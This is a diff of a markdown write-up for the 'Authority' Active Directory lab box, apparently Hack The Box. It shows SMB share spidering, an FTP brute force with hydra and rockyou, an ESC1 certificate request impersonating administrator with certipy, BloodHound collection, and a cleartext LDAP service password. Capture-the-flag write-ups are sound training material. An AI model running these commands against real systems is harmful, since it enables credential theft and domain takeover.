@@ -1,8 +1,15 @@
-```
+---
+title: Authority
+date: 2026-01-05
+image: /assets/posts/post-icons/authority.png
+description: "Windows Active Directory box with Ansible credential extraction, LDAP exploitation, and ESC1 certificate privilege escalation"
+---
+
+```console
 10.10.11.222
 ```
 ## Nmap
-```portscan
+```
 PORT      STATE SERVICE       VERSION
 53/tcp    open  domain        Simple DNS Plus
 80/tcp    open  http          Microsoft IIS httpd 10.0
@@ -54,7 +61,7 @@ Ok so the order of priority for this box is that you should look at smb first, e
 
 ## SMB
 
-```
+```console
 nxc smb $TARGET -u $USER -p $PASS -M spider_plus -o DOWNLOAD_FLAG=True
 ```
 
@@ -84,12 +91,12 @@ we have ansible admin ldap vault hashes in main.yml
 
 I'll try to enumerate the various passwords with the pwm application, if that doesn't work we will go onto the hashes.
 
-```
+```console
 svc_pwm
 svc_ldap
 ```
 
-```
+```console
  hydra -l ceil -P /opt/SecLists/rockyou.txt ftp://10.129.90.182:2121
 ```
 
@@ -321,7 +328,7 @@ we need to see that `Client Authentication               : True`
 we need to see `Enrollee Supplies Subject           : True`
 
 
-```request-cert-as-target
+```
 certipy req \
     -u 'schlop$' -p 'Password123!' \
     -dc-ip '10.10.11.222' -target 'authority.htb' \
@@ -329,11 +336,11 @@ certipy req \
     -upn 'administrator@authority.htb'
 ```
 
-```authenticate
+```
 certipy auth -pfx 'administrator.pfx' -dc-ip $TARGET
 ```
 
-```get-bloodhound-data
+```
 bloodhound-ce-python -d authority.htb -c all  -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -ns $TARGET --zip -k
 ```
 
